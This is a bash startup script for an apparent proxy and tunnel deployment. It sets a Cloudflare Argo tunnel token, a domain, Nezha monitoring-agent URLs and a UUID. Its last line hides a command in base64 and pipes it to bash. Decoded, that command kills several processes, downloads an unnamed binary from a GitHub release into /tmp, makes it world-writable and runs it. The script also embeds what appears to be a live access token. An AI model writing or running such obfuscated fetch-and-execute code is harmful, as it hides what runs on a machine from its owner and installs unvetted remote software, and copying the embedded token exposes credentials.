#!/bin/bash
 
#
export TOK=${TOK:-'eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiNmYwMmIzYzEtY2ZlMi00MTgxLTkxMzctOTQyMjA2N2MwZGVlIiwicyI6Ik5ESmlNbUU1Wm1NdE56QTRZeTAwWldGbExUZzFZVGN0WWpVd01ERXlNemxoTXpJMiJ9'}  #
export ARGO_DOMAIN=${ARGO_DOMAIN:-'st.uribe.dpdns.org'} #

#
export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}  #

# 自定义哪吒探针下载，也可默认0.18.2之前旧版本
export NEZ_AMD_URL=${NEZ_AMD_URL:-'https://github.com/kahunama/myfile/releases/download/main/nezha-agent'}
export NEZ_ARM_URL=${NEZ_ARM_URL:-'https://github.com/kahunama/myfile/releases/download/main/nezha-agent_arm'}

#
export TMP_ARGO=${TMP_ARGO:-'vls'}  #
export UUID="00081f46-1ecc-4fa8-a93a-825e5eb34f02"  #
export CF_IP=${CF_IP:-'ip.sb'}  #
export SUB_NAME=${SUB_NAME:-''} #

# 启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
